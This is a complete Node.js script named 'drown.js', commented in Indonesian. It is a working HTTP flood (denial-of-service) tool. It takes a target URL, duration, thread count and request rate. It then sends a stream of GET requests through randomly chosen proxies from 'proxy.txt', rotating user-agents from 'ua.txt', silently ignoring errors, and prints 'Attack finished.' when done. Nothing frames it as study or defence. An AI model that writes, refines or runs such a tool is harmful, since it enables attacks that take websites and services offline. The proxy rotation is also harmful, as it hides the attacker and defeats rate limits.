const http = require('http');
const https = require('https');
const fs = require('fs');
const url = require('url');

// Parsing argumen input
if (process.argv.length !== 6) {
    console.log('Usage: node drown.js <target> <duration> <threads> <rate>');
    process.exit(1);
}

const target = process.argv[2];
const duration = parseInt(process.argv[3]);
const threads = parseInt(process.argv[4]);
const rate = parseInt(process.argv[5]);

const proxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(Boolean);
const userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(Boolean);

// Fungsi untuk mendapatkan elemen acak dari array
function getRandomArrayElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

// Fungsi untuk memeriksa format proxy yang valid
function isValidProxy(proxy) {
    const parts = proxy.split(':');
    return parts.length === 2 && parts[0] && !isNaN(parts[1]) && parts[1] > 0 && parts[1] < 65536;
}

// Fungsi untuk mengirim request
function sendRequest(proxy) {
    if (!isValidProxy(proxy)) {
        console.error(`Invalid proxy format: ${proxy}`);
        return;
    }

    const targetUrl = url.parse(target);
    const proxyParts = proxy.split(':');
    const isHttps = targetUrl.protocol === 'https:';
    const client = isHttps ? https : http;

    const options = {
        host: proxyParts[0],
        port: proxyParts[1],
        method: 'GET',
        path: targetUrl.href,
        headers: {
            'User-Agent': getRandomArrayElement(userAgents),
            'Host': targetUrl.host
        }
    };

    const req = client.request(options, (res) => {
        res.on('data', () => {});
        res.on('end', () => {});
    });

    req.on('error', () => {}); // Mengabaikan kesalahan
    req.end();
}

// Fungsi untuk melakukan flood menggunakan proxy
function flood() {
    for (let i = 0; i < rate; i++) {
        setImmediate(() => {
            const proxy = getRandomArrayElement(proxies);
            sendRequest(proxy);
        });
    }
}

// Menjalankan flood dengan thread yang diatur
for (let i = 0; i < threads; i++) {
    setInterval(flood, 1000);
}

// Menghentikan serangan setelah durasi selesai
setTimeout(() => {
    console.log('Attack finished.');
    process.exit(0);
}, duration * 1000);
